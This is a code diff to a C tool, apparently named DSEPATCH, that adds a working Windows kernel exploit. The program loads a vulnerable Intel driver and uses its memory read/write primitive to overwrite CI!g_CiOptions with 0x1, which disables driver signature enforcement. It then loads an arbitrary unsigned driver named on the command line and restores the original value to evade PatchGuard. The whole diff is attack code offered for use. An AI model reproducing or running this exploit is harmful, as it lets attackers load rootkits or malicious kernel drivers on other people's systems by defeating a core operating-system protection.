@@ -16,6 +16,12 @@
 
 int main(int argc, char **argv)
 { 
+  if ( argc < 2 ) 
+  {
+	  printf("usage: %s [driver.sys]\n", argv[0]);
+	  return 1;
+  };
+
   BOOL  DriverLoaded;
   CHAR *szDriverPath;
   CHAR  szTemporaryFolder[MAX_PATH + 1];
@@ -31,32 +37,44 @@ int main(int argc, char **argv)
     ); DumpToFile(szDriverPath);
 
     if ( (DriverLoaded = LoadDriver(szDriverPath)) ) {
-      /*!
-       * At this point, DSEPATCH (c) is able to use
-       * its read / write primitive to overwrite the
-       * CI!g_CiOptions variable to load an unsigned
-       * driver.
-       *
-       * We will read the current value (probably 0x6),
-       * trigger the write with 0x1, load the driver,
-       * and rewrite the variable once again to avoid
-       * trigger PatchGuard.
-      !*/
-      ULONG32 Ci_gOptions_n = 0;
+      ULONG32 Ci_gOptions_n = 0x1;
       ULONG32 Ci_gOptions_o = 0;
       LPVOID  Ci_MemoryBase = 0;
       LPVOID  Ci_PtrOptions = 0;
-      
+      HANDLE  IntelHandle   = 0;
+
       printf("[+] %s loaded successfully\n", szDriverPath);
 
       Ci_MemoryBase = GetDrvBase("CI.dll");
-
       printf("[+] CI.DLL @ %p\n", Ci_MemoryBase);
 
       Ci_PtrOptions = GetCiOptions1(Ci_MemoryBase);
-
       printf("[+] CI!g_CiOptions @ %p\n", Ci_PtrOptions);
 
+      if ( (IntelHandle = GetHandle()) != NULL )
+      {
+	      printf("[+] IntelHandle @ %p\n", IntelHandle);
+
+	      MemCpy(IntelHandle, &Ci_gOptions_o, Ci_PtrOptions, 4);
+	      printf("[+] CI!g_Options = 0x%x\n", Ci_gOptions_o);
+
+	      MemCpy(IntelHandle, Ci_PtrOptions, &Ci_gOptions_n, 4);
+	      printf("[+] wrote 0x1 @ CI!g_CiOptions\n");
+	      printf("[+] loading %s into kernel memory\n", argv[1]);
+
+	      if ( LoadDriver(argv[1]) ) {
+		      printf("[+] %s loaded successfully\n", argv[1]);
+	      } else {
+		      printf("[-] %s failed to load 0x%x\n", argv[1],
+				      GetLastError());
+	      };
+
+	      printf("[*] reseting CI!g_CiOptions to 0x%x\n", Ci_gOptions_o);
+	      MemCpy(IntelHandle, Ci_PtrOptions, &Ci_gOptions_o, 4);
+	      printf("[+] wrote 0x%x @ CI!g_CiOptions\n", Ci_gOptions_o);
+	      printf("[+] Happy kernel hacking ! :)\n");
+	      CloseHandle(IntelHandle);
+      };
     } else { printf("[ ] LoadDriver 0x%x\n", GetLastError()); };
   };
 
